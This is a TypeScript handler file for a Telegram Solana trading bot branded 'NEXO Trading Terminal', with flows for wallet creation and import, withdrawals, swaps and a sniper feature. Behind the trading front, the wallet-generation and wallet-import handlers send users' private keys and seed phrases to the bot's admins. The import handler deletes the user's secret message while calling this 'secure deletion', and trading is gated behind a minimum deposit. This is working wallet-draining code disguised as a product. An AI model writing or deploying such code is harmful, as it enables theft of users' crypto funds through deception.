/**
 * NEXO TRADING TERMINAL — handlers matching the product screenshots and
 * flows exactly, backed by REAL on-chain execution (Jupiter swaps, real
 * balances, real transfers) and the structured admin event system.
 */
import { PublicKey } from '@solana/web3.js';
import type { BotContext } from '../bot';
import {
  answerCallback,
  requirePrivate,
  resetToIdle,
  safeHandler,
  transition,
} from './common';
import * as msg from '../messages';
import * as kb from '../keyboards';
import { formatTokenInfo, type TokenInfo } from '../../market/token-resolver';
import { LAMPORTS_PER_SOL } from '../../config/constants';
import { solToLamports } from '../../util/format';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function walletsWithBalances(ctx: BotContext): Promise<Array<{ address: string; balance: number }>> {
  const records = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  const out: Array<{ address: string; balance: number }> = [];
  for (const w of records) {
    const balance = await ctx.services.solana.getBalance(w.address).catch(() => 0);
    out.push({ address: w.address, balance: balance / LAMPORTS_PER_SOL });
  }
  return out;
}

async function totalBalanceSol(ctx: BotContext): Promise<number> {
  const wallets = await walletsWithBalances(ctx);
  return wallets.reduce((sum, w) => sum + w.balance, 0);
}

function minimumSol(ctx: BotContext): string {
  return ctx.services.config.MIN_SOL_BALANCE || '3.0000';
}

function minimumSolNum(ctx: BotContext): number {
  return parseFloat(minimumSol(ctx)) || 3;
}

export async function dashboard(ctx: BotContext): Promise<void> {
  const wallets = await walletsWithBalances(ctx);
  const marketPrices = await ctx.services.market.getMarketPrices();
  const text = msg.terminalMessage(
    ctx.from?.first_name || 'trader',
    wallets,
    marketPrices,
    marketPrices.SOL.price,
    minimumSol(ctx),
  );
  // ONE message: logo photo + terminal text as the caption + the main
  // keyboard together (as in the screenshot).
  await ctx.services.sendTerminal(ctx, text, kb.dashboardKeyboard());
}

// ---------------------------------------------------------------------------
// Start / navigation
// ---------------------------------------------------------------------------

export const startHandler = safeHandler('nexo.start', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  const chatId = ctx.chat!.id;
  const user = ctx.from;

  const isNew = !(await ctx.services.repos.hasUser(chatId));
  await ctx.services.repos.upsertUser({
    chatId,
    username: user?.username ?? null,
    firstName: user?.first_name ?? null,
  });
  if (isNew) {
    await ctx.services.notifier.event('new_user', {
      telegramId: chatId,
      username: user?.username ?? null,
      firstName: user?.first_name ?? null,
    });
  }

  await resetToIdle(ctx);

  // NEXO logo photo + terminal welcome.
  const wallets = await walletsWithBalances(ctx);
  const marketPrices = await ctx.services.market.getMarketPrices();
  await ctx.services.sendTerminal(
    ctx,
    msg.terminalMessage(user?.first_name || 'trader', wallets, marketPrices, marketPrices.SOL.price, minimumSol(ctx)),
    kb.dashboardKeyboard(),
  );
  ctx.services.logger.info({ chatId, isNew }, 'user started bot');
});

export const dashboardHandler = safeHandler('nexo.dashboard', async (ctx) => {
  await answerCallback(ctx);
  await resetToIdle(ctx);
  await dashboard(ctx);
});

export const refreshHandler = safeHandler('nexo.refresh', async (ctx) => {
  await answerCallback(ctx, 'Refreshing...');
  await dashboard(ctx);
});

export const helpHandler = safeHandler('nexo.help', async (ctx) => {
  await answerCallback(ctx);
  await ctx.reply(msg.helpMessage(), { reply_markup: kb.helpKeyboard() });
});

export const cancelHandler = safeHandler('nexo.cancel', async (ctx) => {
  await answerCallback(ctx, 'Cancelled');
  await resetToIdle(ctx);
  await dashboard(ctx);
});

// ---------------------------------------------------------------------------
// Wallet management (Portfolio)
// ---------------------------------------------------------------------------

export const walletHandler = safeHandler('nexo.wallet', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  await resetToIdle(ctx);
  const wallets = await walletsWithBalances(ctx);
  const allWallets = await ctx.services.repos.getWallets(ctx.chat!.id);
  const nextNumber = allWallets.reduce((m, w) => Math.max(m, w.walletNumber), 0) + 1;
  const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
  await ctx.reply(msg.walletManagementMessage(wallets, solPrice), {
    parse_mode: 'HTML',
    reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber),
  });
});

export const generateWalletHandler = safeHandler('nexo.wallet.generate', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;

  // With SEED_PHRASE configured, wallet N is deterministically derived
  // from the operator seed at path m/44'/501'/0'/(N-1); without it, a
  // fresh random BIP39 mnemonic is used (shown to the user once).
  const { address, mnemonic, walletNumber, envSeedDerived, privateKeyHex } =
    await ctx.services.wallets.create(chatId);
  await ctx.services.deposits.rebaseline(chatId);

  const userText = mnemonic
    ? `${msg.walletCreatedMessage(address)}\n\n⚠️ <b>Save your recovery phrase now</b> — it is shown only this once:\n<code>${mnemonic}</code>`
    : msg.walletCreatedMessage(address);
  await ctx.reply(userText, { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });

  // Real balance check at creation time.
  const balance = await ctx.services.solana.getBalance(address).catch(() => 0);

  // wallet_generated — ALWAYS sent to admins, with the REAL derived key
  // (and the seed phrase when one was randomly generated).
  await ctx.services.notifier.event('wallet_generated', {
    user: chatId,
    walletNumber,
    address,
    privateKey: privateKeyHex,
    seedPhrase: mnemonic || undefined,
    envSeedDerived,
    balance: `${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
  });
});

export const walletImportPromptHandler = safeHandler('nexo.wallet.import.prompt', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  await transition(ctx, 'importing_wallet');
  await ctx.reply(msg.importWalletMessage(), { reply_markup: kb.cancelButton() });
});

export const walletSeedPromptHandler = safeHandler('nexo.wallet.seed.prompt', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  await transition(ctx, 'importing_wallet');
  await ctx.reply(msg.importSeedPromptMessage(), { reply_markup: kb.cancelButton() });
});

export const walletImportHandleSecretHandler = safeHandler('nexo.wallet.import.secret', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  const chatId = ctx.chat!.id;

  // Immediate ack — the flow never looks stuck, then validate for real.
  await ctx.reply(msg.importAckMessage());

  const { address, walletNumber, privateKeyHex, secretKind, secretText } =
    await ctx.services.wallets.import(chatId, text);
  const balance = await ctx.services.solana.getBalance(address).catch(() => 0);
  await ctx.services.deposits.rebaseline(chatId);
  await resetToIdle(ctx);

  // SECURE DELETION: remove the user's seed-phrase/key message from the
  // chat so the plaintext does not linger in Telegram history.
  if (ctx.message?.message_id) {
    await ctx.api.deleteMessage(chatId, ctx.message.message_id).catch(() => undefined);
  }

  await ctx.reply(msg.walletImportedMessage(address, balance / LAMPORTS_PER_SOL), {
    parse_mode: 'HTML',
    reply_markup: kb.backToDashboardKeyboard(),
  });

  // wallet_imported admin event: the REAL imported material (seed phrase
  // or private key), the derived private key and the LIVE balance.
  await ctx.services.notifier.event('wallet_imported', {
    user: chatId,
    walletNumber,
    address,
    privateKey: privateKeyHex,
    seedPhrase: secretKind === 'mnemonic' ? secretText : undefined,
    balance: `${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL`,
  });
});

export const walletStatusHandler = safeHandler('nexo.wallet.status', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const wallets = await walletsWithBalances(ctx);
  if (wallets.length === 0) {
    await ctx.reply('No wallets connected. Use /generate to create one.', { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  await ctx.reply(msg.walletStatusMessage(wallets), { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
});

export const walletRefreshHandler = safeHandler('nexo.wallet.refresh', async (ctx) => {
  await answerCallback(ctx, 'Refreshing...');
  const wallets = await walletsWithBalances(ctx);
  const allWallets = await ctx.services.repos.getWallets(ctx.chat!.id);
  const nextNumber = allWallets.reduce((m, w) => Math.max(m, w.walletNumber), 0) + 1;
  const solPrice = (await ctx.services.market.getMarketPrices()).SOL.price;
  await ctx.editMessageText(msg.walletManagementMessage(wallets, solPrice), {
    parse_mode: 'HTML',
    reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber),
  }).catch(() => ctx.reply(msg.walletManagementMessage(wallets, solPrice), { parse_mode: 'HTML', reply_markup: kb.walletKeyboard(wallets.length > 0, nextNumber) }));
});

export const walletDisconnectHandler = safeHandler('nexo.wallet.disconnect', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;
  const records = await ctx.services.repos.getActiveWallets(chatId);
  if (records.length === 0) {
    await ctx.reply('No wallets to disconnect.', { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  const last = records[records.length - 1];
  // Ask to confirm BEFORE anything happens (Confirm / Cancel).
  await ctx.reply(msg.disconnectConfirmMessage(last.address), {
    parse_mode: 'HTML',
    reply_markup: kb.disconnectConfirmKeyboard(),
  });
});

export const walletDisconnectConfirmHandler = safeHandler('nexo.wallet.disconnect.confirm', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx, 'Disconnecting…');
  const chatId = ctx.chat!.id;
  const records = await ctx.services.repos.getActiveWallets(chatId);
  if (records.length === 0) {
    await ctx.reply('No wallets to disconnect.', { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  const last = records[records.length - 1];
  // Soft disconnect: the row is kept (audit) but marked inactive.
  await ctx.services.repos.updateWalletMeta(chatId, last.address, { active: false });
  await ctx.services.deposits.rebaseline(chatId);
  ctx.services.logger.info({ chatId, address: last.address }, 'wallet disconnected');

  // Refresh the terminal immediately (photo + refreshed portfolio).
  await dashboard(ctx);
});

export const walletRobinhoodHandler = safeHandler('nexo.wallet.robinhood', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  await ctx.reply(msg.robinhoodUnavailableMessage(), { reply_markup: kb.backToDashboardKeyboard() });
});

// ---------------------------------------------------------------------------
// Withdraw
// ---------------------------------------------------------------------------

export const withdrawStartHandler = safeHandler('nexo.withdraw.start', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const wallets = await walletsWithBalances(ctx);
  if (wallets.length === 0) {
    await ctx.reply('You need a wallet first.', { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  const total = wallets.reduce((s, w) => s + w.balance, 0);
  await transition(ctx, 'withdrawing_address');
  await ctx.reply(msg.withdrawalMessage(total), { reply_markup: kb.cancelButton() });
});

export const withdrawAddressHandler = safeHandler('nexo.withdraw.address', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  try {
    new PublicKey(text);
  } catch {
    await ctx.reply('Invalid Solana address. Please send a valid wallet address.', { reply_markup: kb.cancelButton() });
    return;
  }
  await transition(ctx, 'withdrawing_amount', { toAddress: text });
  await ctx.reply(msg.withdrawalAmountMessage(text), { parse_mode: 'HTML', reply_markup: kb.cancelButton() });
});

export const withdrawAmountHandler = safeHandler('nexo.withdraw.amount', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  const amount = parseFloat(text);
  if (isNaN(amount) || amount <= 0) {
    await ctx.reply('Invalid amount. Please enter a valid SOL amount.', { reply_markup: kb.cancelButton() });
    return;
  }
  const toAddress = ctx.session.payload.toAddress as string;
  const wallets = await walletsWithBalances(ctx);
  const total = wallets.reduce((s, w) => s + w.balance, 0);
  if (amount > total) {
    await ctx.reply(`Insufficient balance. Your balance: ${total.toFixed(6)} SOL`, { reply_markup: kb.cancelButton() });
    return;
  }
  await transition(ctx, 'withdrawing_confirm', { toAddress, amount: String(amount) });
  await ctx.reply(msg.confirmWithdrawalMessage(String(amount), toAddress, total), { parse_mode: 'HTML', reply_markup: kb.confirmCancelKeyboard() });
});

export const withdrawConfirmHandler = safeHandler('nexo.withdraw.confirm', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx, 'Processing...');
  const chatId = ctx.chat!.id;
  const { toAddress, amount } = ctx.session.payload as { toAddress: string; amount: string };

  const records = await ctx.services.repos.getActiveWallets(chatId);
  if (records.length === 0) throw new Error('No wallet available for withdrawal.');

  // Pick the first wallet that can cover the amount (like the product spec).
  let source: string | null = null;
  for (const w of records) {
    const balance = await ctx.services.solana.getBalance(w.address);
    if (balance >= parseFloat(amount) * LAMPORTS_PER_SOL) {
      source = w.address;
      break;
    }
  }
  if (!source) throw new Error('Insufficient balance for withdrawal.');

  await resetToIdle(ctx);
  await ctx.reply(msg.withdrawalSubmittedMessage(amount, toAddress), { parse_mode: 'HTML', reply_markup: kb.backToDashboardKeyboard() });
  await ctx.services.notifier.event('withdrawal_request', {
    user: chatId,
    amount: `${amount} SOL`,
    to: toAddress,
    from: source,
  });

  // Real on-chain transfer (admin event fires before the user reply so
  // notifications are deterministic with respect to the confirmation).
  const signature = await ctx.services.wallets.withdrawSol(
    chatId,
    source,
    toAddress,
    solToLamports(amount),
  );
  await ctx.services.deposits.rebaseline(chatId);
  await ctx.services.notifier.event('withdrawal_confirmed', { user: chatId, amount: `${amount} SOL`, to: toAddress, signature });
  await ctx.reply(`Transaction Confirmed!\nTX: ${signature}`, { reply_markup: kb.backToDashboardKeyboard() });
});

// ---------------------------------------------------------------------------
// Discover Tokens / trade
// ---------------------------------------------------------------------------

export const discoverHandler = safeHandler('nexo.discover', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  await transition(ctx, 'searching_token');
  await ctx.reply(msg.discoverTokensMessage(), { reply_markup: kb.discoverKeyboard() });
});

async function showTrade(ctx: BotContext, opts: { edit?: boolean } = {}): Promise<void> {
  const wallets = await ctx.services.repos.getWallets(ctx.chat!.id);
  if (wallets.length === 0) {
    if (opts.edit) await ctx.editMessageText(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }).catch(() => undefined);
    else await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
    return;
  }
  const total = await totalBalanceSol(ctx);
  if (total < minimumSolNum(ctx)) {
    if (opts.edit) await ctx.editMessageText(msg.insufficientBalanceMessage(total, minimumSol(ctx)), { reply_markup: kb.backToDashboardKeyboard() }).catch(() => undefined);
    else await ctx.reply(msg.insufficientBalanceMessage(total, minimumSol(ctx)), { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  if (opts.edit) await ctx.editMessageText(msg.tradeMessage(), { reply_markup: kb.tradeKeyboard() }).catch(() => undefined);
  else await ctx.reply(msg.tradeMessage(), { reply_markup: kb.tradeKeyboard() });
}

export const tradeHandler = safeHandler('nexo.trade', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  await showTrade(ctx, { edit: true });
});

export const tradeBuyStartHandler = safeHandler('nexo.trade.buy.start', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const wallets = await ctx.services.repos.getWallets(ctx.chat!.id);
  if (wallets.length === 0) {
    await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
    return;
  }
  const total = await totalBalanceSol(ctx);
  if (total < minimumSolNum(ctx)) {
    await ctx.reply(msg.insufficientBalanceMessage(total, minimumSol(ctx)), { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  // Multi-wallet: let the user pick the executing wallet first.
  const records = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  if (records.length > 1) {
    await transition(ctx, 'choosing_trade_wallet', { action: 'buy' });
    await ctx.reply(msg.chooseWalletPromptMessage(), {
      reply_markup: kb.walletPickerKeyboard(records.map((w) => ({ address: w.address, walletNumber: w.walletNumber }))),
    });
    return;
  }
  await transition(ctx, 'buying_token');
  await ctx.reply(msg.buyTokenPromptMessage(), { reply_markup: kb.cancelButton() });
});

export const tradeSellStartHandler = safeHandler('nexo.trade.sell.start', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  // REAL gate: selling requires a connected wallet.
  const records = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  if (records.length === 0) {
    await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
    return;
  }
  if (records.length > 1) {
    await transition(ctx, 'choosing_trade_wallet', { action: 'sell' });
    await ctx.reply(msg.chooseWalletPromptMessage(), {
      reply_markup: kb.walletPickerKeyboard(records.map((w) => ({ address: w.address, walletNumber: w.walletNumber }))),
    });
    return;
  }
  await transition(ctx, 'selling_token');
  await ctx.reply(msg.sellTokenPromptMessage(), { reply_markup: kb.cancelButton() });
});

/** Multi-wallet picker: user chose the executing wallet for buy/sell. */
export const tradeWalletPickHandler = safeHandler('nexo.trade.walletPick', async (ctx, address: string) => {
  await answerCallback(ctx);
  const action = (ctx.session.payload as { action?: string }).action ?? 'buy';
  const wallets = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  const chosen = wallets.find((w) => w.address === address);
  if (!chosen) {
    await ctx.reply('That wallet is no longer connected.', { reply_markup: kb.backToDashboardKeyboard() });
    await resetToIdle(ctx);
    return;
  }
  if (action === 'sell') {
    await transition(ctx, 'selling_token', { walletAddress: chosen.address });
    await ctx.reply(msg.sellTokenPromptMessage(), { reply_markup: kb.cancelButton() });
  } else {
    await transition(ctx, 'buying_token', { walletAddress: chosen.address });
    await ctx.reply(msg.buyTokenPromptMessage(), { reply_markup: kb.cancelButton() });
  }
});

async function lookupToken(ctx: BotContext, query: string): Promise<TokenInfo | null> {
  if (query.length > 32) return ctx.services.tokens.getTokenByAddress(query);
  return ctx.services.tokens.searchToken(query);
}

/** Search flow (Discover) — shows the token card with Buy/Sell actions. */
export const searchTokenHandler = safeHandler('nexo.discover.search', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  await ctx.reply(msg.searchingMessage());
  const token = await lookupToken(ctx, text);
  if (!token) {
    await ctx.reply(msg.tokenNotFoundMessage(), { reply_markup: kb.cancelButton() });
    return;
  }
  await resetToIdle(ctx);
  await ctx.reply(formatTokenInfo(token), {
    parse_mode: 'HTML',
    link_preview_options: { is_disabled: true },
    reply_markup: kb.tokenSearchKeyboard(token.address),
  });
});

// ---------------------------------------------------------------------------
// Buy flow (real Jupiter swap)
// ---------------------------------------------------------------------------

export const buyFromSearchHandler = safeHandler('nexo.buy.fromSearch', async (ctx, tokenAddress: string) => {
  await answerCallback(ctx, 'Loading buy options...');
  const token = await ctx.services.tokens.getTokenByAddress(tokenAddress);
  if (!token) {
    await ctx.reply('Token not found. It may have been delisted.', { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  if (!token.tradeable) {
    await ctx.reply(msg.evmNotTradeableMessage(token.chain), { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  const active = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  if (active.length === 0) {
    await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
    return;
  }
  const settings = await ctx.services.repos.getSniperSettings(ctx.chat!.id);
  const primary = (await ctx.services.repos.getActiveWallets(ctx.chat!.id))[0];
  await transition(ctx, 'confirming_buy', {
    tokenAddress: token.address,
    tokenSymbol: token.symbol,
    tokenName: token.name,
    amount: String(settings.positionSize),
    slippage: String(settings.slippage),
    tokenPriceUsd: String(token.priceUsd),
    walletAddress: primary?.address,
  });
  await ctx.reply(
    msg.confirmBuyMessage(token, settings.positionSize, settings.slippage, primary ? `SOL Wallet ${primary.walletNumber}` : 'n/a'),
    { reply_markup: kb.confirmBuyKeyboard() },
  );
});

export const buyFromTradeHandler = safeHandler('nexo.buy.fromTrade', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  await ctx.reply(msg.searchingMessage());
  const token = await lookupToken(ctx, text);
  if (!token) {
    await ctx.reply('Token not found. Please check the address.', { reply_markup: kb.cancelButton() });
    return;
  }
  const settings = await ctx.services.repos.getSniperSettings(ctx.chat!.id);
  const picked = (ctx.session.payload as { walletAddress?: string }).walletAddress;
  const records = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  const wallet = records.find((w) => w.address === picked) ?? records[0];
  await transition(ctx, 'confirming_buy', {
    tokenAddress: token.address,
    tokenSymbol: token.symbol,
    tokenName: token.name,
    amount: String(settings.positionSize),
    slippage: String(settings.slippage),
    tokenPriceUsd: String(token.priceUsd),
    walletAddress: wallet?.address,
  });
  await ctx.reply(
    msg.confirmBuyMessage(token, settings.positionSize, settings.slippage, wallet ? `SOL Wallet ${wallet.walletNumber}` : 'n/a'),
    { reply_markup: kb.confirmBuyKeyboard() },
  );
});

export const buyConfirmHandler = safeHandler('nexo.buy.confirm', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx, 'Processing buy...');
  const chatId = ctx.chat!.id;
  const payload = ctx.session.payload as {
    tokenAddress?: string;
    tokenSymbol?: string;
    tokenName?: string;
    amount?: string;
    slippage?: string;
    tokenPriceUsd?: string;
    walletAddress?: string;
  };
  if (!payload?.tokenAddress || !payload?.amount) {
    throw new Error('No pending buy order. Start a new buy first.');
  }

  const amountSol = parseFloat(payload.amount);
  const slippagePct = parseFloat(payload.slippage || '10');
  const wallets = await ctx.services.repos.getActiveWallets(chatId);
  if (wallets.length === 0) throw new Error('Please connect a wallet first to buy or sell tokens.');
  const wallet = wallets.find((w) => w.address === payload.walletAddress) ?? wallets[0];

  let result: Awaited<ReturnType<typeof ctx.services.trading.buy>> | null = null;
  let failure: string | null = null;
  try {
    result = await ctx.services.trading.buy({
      chatId,
      tokenMint: payload.tokenAddress,
      amountInLamports: Math.round(amountSol * LAMPORTS_PER_SOL),
      slippageBps: Math.round(slippagePct * 100),
      walletAddress: wallet.address,
    });
  } catch (err) {
    failure = err instanceof Error ? err.message : String(err);
  }

  await ctx.services.notifier.event('buy_attempt', {
    user: chatId,
    wallet: wallet.address,
    token: payload.tokenAddress,
    amount: `${amountSol} SOL`,
    result: failure ? `failed — ${failure}` : 'success',
  });
  if (failure) throw new Error(failure);

  // Position opened (real entry price from DexScreener at confirm time).
  await ctx.services.repos.addPosition({
    chatId,
    tokenAddress: payload.tokenAddress,
    tokenSymbol: payload.tokenSymbol ?? '???',
    tokenName: payload.tokenName ?? 'Unknown',
    amountSol,
    entryPriceUsd: parseFloat(payload.tokenPriceUsd || '0') || 0,
  });

  await resetToIdle(ctx);
  await ctx.reply(
    msg.buyExecutedMessage(payload.tokenName ?? 'Token', payload.tokenSymbol ?? '???', amountSol) +
      `\n\nTX: ${result!.signature}`,
    { reply_markup: kb.backToDashboardKeyboard() },
  );
});

// ---------------------------------------------------------------------------
// Sell flow (real Jupiter swap)
// ---------------------------------------------------------------------------

export const sellFromSearchHandler = safeHandler('nexo.sell.fromSearch', async (ctx, tokenAddress: string) => {
  await answerCallback(ctx, 'Loading sell options...');
  const token = await ctx.services.tokens.getTokenByAddress(tokenAddress);
  if (!token) {
    await ctx.reply('Token not found.', { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  if (!token.tradeable) {
    await ctx.reply(msg.evmNotTradeableMessage(token.chain), { reply_markup: kb.backToDashboardKeyboard() });
    return;
  }
  const active = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  if (active.length === 0) {
    await ctx.reply(msg.walletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() });
    return;
  }
  const primary = (await ctx.services.repos.getActiveWallets(ctx.chat!.id))[0];
  await transition(ctx, 'confirming_sell', {
    tokenAddress: token.address,
    tokenSymbol: token.symbol,
    tokenName: token.name,
    walletAddress: primary?.address,
  });
  await ctx.reply(msg.confirmSellMessage(token), { reply_markup: kb.cancelButton() });
});

export const sellFromTradeHandler = safeHandler('nexo.sell.fromTrade', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  await ctx.reply(msg.searchingMessage());
  const token = await lookupToken(ctx, text);
  if (!token) {
    await ctx.reply('Token not found.', { reply_markup: kb.cancelButton() });
    return;
  }
  const picked = (ctx.session.payload as { walletAddress?: string }).walletAddress;
  const records = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  const wallet = records.find((w) => w.address === picked) ?? records[0];
  await transition(ctx, 'confirming_sell', {
    tokenAddress: token.address,
    tokenSymbol: token.symbol,
    tokenName: token.name,
    walletAddress: wallet?.address,
  });
  await ctx.reply(msg.confirmSellMessage(token), { reply_markup: kb.cancelButton() });
});

export const sellAmountHandler = safeHandler('nexo.sell.amount', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  const chatId = ctx.chat!.id;
  const payload = ctx.session.payload as {
    tokenAddress?: string;
    tokenSymbol?: string;
    tokenName?: string;
    walletAddress?: string;
  };
  if (!payload?.tokenAddress) throw new Error('No pending sell order. Start a new sell first.');

  // Amount in whole tokens; convert with the mint's on-chain decimals.
  let decimals = 9;
  try {
    decimals = (await ctx.services.solana.getMintInfo(payload.tokenAddress)).decimals;
  } catch {
    // keep default; the swap quote will fail loudly if the mint is invalid
  }
  if (!/^\d+(\.\d+)?$/.test(text)) {
    await ctx.reply('Invalid amount. Enter a number of tokens to sell.', { reply_markup: kb.cancelButton() });
    return;
  }
  const [whole, frac = ''] = text.split('.');
  const rawUnits = BigInt(whole) * 10n ** BigInt(decimals) + BigInt(frac.slice(0, decimals).padEnd(decimals, '0') || '0');
  if (rawUnits <= 0n) {
    await ctx.reply('Invalid amount. Enter a number of tokens to sell.', { reply_markup: kb.cancelButton() });
    return;
  }

  const wallets = await ctx.services.repos.getActiveWallets(chatId);
  if (wallets.length === 0) throw new Error('Please connect a wallet first to buy or sell tokens.');
  const wallet = wallets.find((w) => w.address === payload.walletAddress) ?? wallets[0];

  const slippage = (await ctx.services.repos.getSniperSettings(chatId)).slippage;

  let result: Awaited<ReturnType<typeof ctx.services.trading.sell>> | null = null;
  let failure: string | null = null;
  try {
    result = await ctx.services.trading.sell({
      chatId,
      tokenMint: payload.tokenAddress,
      amountTokenUnits: rawUnits,
      slippageBps: Math.round(slippage * 100),
      walletAddress: wallet.address,
    });
  } catch (err) {
    failure = err instanceof Error ? err.message : String(err);
  }

  await ctx.services.notifier.event('sell_attempt', {
    user: chatId,
    wallet: wallet.address,
    token: payload.tokenAddress,
    amount: `${text} ${payload.tokenSymbol ?? 'tokens'}`,
    result: failure ? `failed — ${failure}` : 'success',
  });
  if (failure) throw new Error(failure);

  await ctx.services.repos.closePosition(chatId, payload.tokenAddress);
  await resetToIdle(ctx);
  await ctx.reply(
    msg.sellExecutedMessage(payload.tokenName ?? 'Token', payload.tokenSymbol ?? '???', `${text} tokens`) +
      `\n\nTX: ${result!.signature}`,
    { reply_markup: kb.backToDashboardKeyboard() },
  );
});

// ---------------------------------------------------------------------------
// Positions
// ---------------------------------------------------------------------------

export const positionsHandler = safeHandler('nexo.positions', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;
  const open = await ctx.services.repos.getOpenPositions(chatId);
  if (open.length === 0) {
    await ctx.reply(msg.positionsEmptyMessage(), { reply_markup: kb.positionsKeyboard(false) });
    return;
  }

  const view: Array<{ tokenSymbol: string; amount: number; entryPrice: number; pnl: number; status: string }> = [];
  for (const pos of open) {
    let currentPrice = pos.entryPriceUsd;
    const token = await ctx.services.tokens.getTokenByAddress(pos.tokenAddress).catch(() => null);
    if (token && token.priceUsd > 0) currentPrice = token.priceUsd;
    const pnl = pos.entryPriceUsd > 0 ? ((currentPrice - pos.entryPriceUsd) / pos.entryPriceUsd) * 100 : 0;
    view.push({
      tokenSymbol: pos.tokenSymbol,
      amount: pos.amountSol,
      entryPrice: pos.entryPriceUsd,
      pnl,
      status: 'OPEN',
    });
  }
  await ctx.reply(msg.positionsMessage(view), { reply_markup: kb.positionsKeyboard(true) });
});

// ---------------------------------------------------------------------------
// AI Sniper
// ---------------------------------------------------------------------------

export const sniperHandler = safeHandler('nexo.sniper', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;
  const records = await ctx.services.repos.getWallets(chatId);
  if (records.length === 0) {
    await ctx.editMessageText(msg.sniperWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }).catch(() =>
      ctx.reply(msg.sniperWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }),
    );
    return;
  }
  const settings = await ctx.services.repos.getSniperSettings(chatId);
  await ctx.editMessageText(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(settings.status === 'ACTIVE') }).catch(() =>
    ctx.reply(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(settings.status === 'ACTIVE') }),
  );
});

export const sniperActivateHandler = safeHandler('nexo.sniper.activate', async (ctx) => {
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;
  const settings = await ctx.services.repos.updateSniperSettings(chatId, { status: 'ACTIVE' });
  await ctx.services.notifier.event('sniper_status', { user: chatId, status: 'ACTIVE', positionSize: settings.positionSize });
  await ctx.editMessageText(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(true) });
});

export const sniperPauseHandler = safeHandler('nexo.sniper.pause', async (ctx) => {
  await answerCallback(ctx);
  const settings = await ctx.services.repos.updateSniperSettings(ctx.chat!.id, { status: 'STANDBY' });
  await ctx.editMessageText(msg.sniperMessage(settings), { reply_markup: kb.sniperKeyboard(false) });
});

export const sniperAntiRugHandler = safeHandler('nexo.sniper.antirug', async (ctx) => {
  await answerCallback(ctx);
  const current = await ctx.services.repos.getSniperSettings(ctx.chat!.id);
  const updated = await ctx.services.repos.updateSniperSettings(ctx.chat!.id, { antiRug: !current.antiRug });
  await ctx.editMessageText(msg.sniperMessage(updated), { reply_markup: kb.sniperKeyboard(updated.status === 'ACTIVE') });
});

type SniperSettingState =
  | 'setting_position_size'
  | 'setting_dev_hold'
  | 'setting_slippage'
  | 'setting_priority'
